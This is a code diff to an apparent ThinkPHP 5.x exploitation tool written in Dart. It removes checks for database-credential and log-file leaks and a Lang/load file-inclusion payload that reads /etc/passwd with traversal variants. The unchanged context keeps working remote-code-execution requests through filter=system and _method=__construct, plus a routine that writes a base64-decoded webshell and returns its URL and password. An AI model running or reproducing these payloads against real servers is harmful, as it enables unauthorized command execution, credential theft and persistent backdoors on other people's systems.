@@ -19,13 +19,6 @@ class ThinkphpV5ExpService {
   });
 
   static const String _phpVersionCheck = 'PHP Version';
-  static const String _tp5LogInfo = '[ info ]';
-  static const String _tp5LogErr = '[ error ]';
-
-  static final _falsePositivePatterns = RegExp(
-    r'^(forbidden|403|404|not found|error|denied|unauthorized|access denied|bad request|invalid|<!doctype|<\?xml)\s*$',
-    caseSensitive: false,
-  );
 
   static Map<String, String> formMap(String s) {
     final result = <String, String>{};
@@ -128,62 +121,6 @@ class ThinkphpV5ExpService {
     return ThinkphpResult(false, 'ThinkPHP 5.0.24-5.1.30 RCE', '');
   }
 
-  Future<ThinkphpResult> checkTp5Db() async {
-    final mod = await getModule();
-    final urls = [
-      '${baseUri}?s=$mod/think\\config/get&name=database.username',
-      '${baseUri}?s=$mod/think\\config/get&name=database.hostname',
-      '${baseUri}?s=$mod/think\\config/get&name=database.password',
-      '${baseUri}?s=$mod/think\\config/get&name=database.database',
-    ];
-    try {
-      String? username, hostname, password, database;
-      String? valid(String? s) =>
-          (s != null && s.isNotEmpty && !_falsePositivePatterns.hasMatch(s.trim()))
-          ? s.trim()
-          : null;
-
-      final r0 = await http.get(Uri.parse(urls[0])).timeout(timeout);
-      username = r0.body.length < 20 ? valid(r0.body.trim()) : null;
-      final r1 = await http.get(Uri.parse(urls[1])).timeout(timeout);
-      hostname = r1.body.length < 20 ? valid(r1.body.trim()) : null;
-      final r2 = await http.get(Uri.parse(urls[2])).timeout(timeout);
-      password = r2.body.length < 40 ? valid(r2.body.trim()) : null;
-      final r3 = await http.get(Uri.parse(urls[3])).timeout(timeout);
-      database = r3.body.length < 20 ? valid(r3.body.trim()) : null;
-      if (username != null || hostname != null || password != null || database != null) {
-        return ThinkphpResult(
-          true,
-          'ThinkPHP 5.x 数据库信息泄露',
-          'username:$username hostname:$hostname password:$password database:$database',
-        );
-      }
-    } catch (_) {}
-    return ThinkphpResult(false, 'ThinkPHP 5.x 数据库信息泄露', '');
-  }
-
-  Future<ThinkphpResult> checkTp5Log() async {
-    final now = DateTime.now();
-    final y = now.year.toString();
-    final m = now.month.toString().padLeft(2, '0');
-    final d = now.day.toString().padLeft(2, '0');
-    final urls = [
-      '${baseUri}runtime/log/$y$m/${d}.log',
-      '${baseUri}runtime/log/$y$m/${d}_cli.log',
-      '${baseUri}runtime/log/$y$m/${d}_error.log',
-      '${baseUri}runtime/log/$y$m/${d}_sql.log',
-    ];
-    for (final u in urls) {
-      try {
-        final res = await http.get(Uri.parse(u)).timeout(timeout);
-        if (res.body.contains(_tp5LogInfo) || res.body.contains(_tp5LogErr)) {
-          return ThinkphpResult(true, 'ThinkPHP 5.x 日志泄露', u);
-        }
-      } catch (_) {}
-    }
-    return ThinkphpResult(false, 'ThinkPHP 5.x 日志泄露', '');
-  }
-
   Future<ThinkphpResult> checkTp5023Debug() async {
     final payloads = [
       {'_method': '__construct', 'filter[]': 'phpinfo', 'server[REQUEST_METHOD]': '1'},
@@ -234,41 +171,6 @@ class ThinkphpV5ExpService {
     return ThinkphpResult(false, 'ThinkPHP 5.x _method=filter RCE', '');
   }
 
-  Future<ThinkphpResult> checkTp5FileInclude() async {
-    final mod = await getModule();
-    final filePayloads = ['/etc/passwd', '....//....//....//....//etc/passwd', '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'];
-    for (final file in filePayloads) {
-      try {
-        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(file)}';
-        final res = await http.get(Uri.parse(u)).timeout(timeout);
-        if (res.body.contains('root:') || res.body.contains('root:x:')) {
-          return ThinkphpResult(true, 'ThinkPHP 5.x Lang/load 文件包含', u);
-        }
-      } catch (_) {}
-    }
-    return ThinkphpResult(false, 'ThinkPHP 5.x Lang/load 文件包含', '');
-  }
-
-  Future<ThinkphpResult> checkTp5ConfigGet() async {
-    final payloads = ['database.username', 'database.password', 'database.hostname', 'app_debug'];
-    final pathVariants = ['.|think\\config/get', 'index|think\\config/get'];
-    for (final path in pathVariants) {
-      for (final name in payloads) {
-        try {
-          final u = '${baseUri}?s=$path&name=$name';
-          final res = await http.get(Uri.parse(u)).timeout(timeout);
-          if (res.statusCode == 200 && res.body.isNotEmpty && res.body.length < 500 && !res.body.contains('<!DOCTYPE')) {
-            final val = res.body.trim();
-            if (val.isNotEmpty && !val.startsWith('{') && !val.contains('<html') && !_falsePositivePatterns.hasMatch(val)) {
-              return ThinkphpResult(true, 'ThinkPHP 5.0.22 config 泄露', '$name=$val');
-            }
-          }
-        } catch (_) {}
-      }
-    }
-    return ThinkphpResult(false, 'ThinkPHP 5.0.22 config 泄露', '');
-  }
-
   Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
     final mod = await getModule();
     final encodedCmd = Uri.encodeComponent(cmd);
@@ -313,11 +215,6 @@ class ThinkphpV5ExpService {
         final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
         final res = await http.post(baseUri, body: body).timeout(timeout);
         return extractBeforeHtml(res.body);
-      case ThinkphpVulnType.tp5FileInclude:
-        final filePath = cmd.trim().isEmpty ? '/etc/passwd' : cmd.trim();
-        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(filePath)}';
-        final res = await http.get(Uri.parse(u)).timeout(timeout);
-        return res.body;
       case ThinkphpVulnType.tp5024_5130:
         final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$encodedCmd';
         final res = await http.get(Uri.parse(u)).timeout(timeout);
@@ -412,8 +309,6 @@ class ThinkphpV5ExpService {
         await http.post(baseUri, body: body).timeout(timeout);
         final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
         return check.statusCode == 200 ? '$baseUri$shellFile Pass:$shellPass' : null;
-      case ThinkphpVulnType.tp5FileInclude:
-        return null;
       case ThinkphpVulnType.tp5024_5130:
         final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
         final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$cmd';
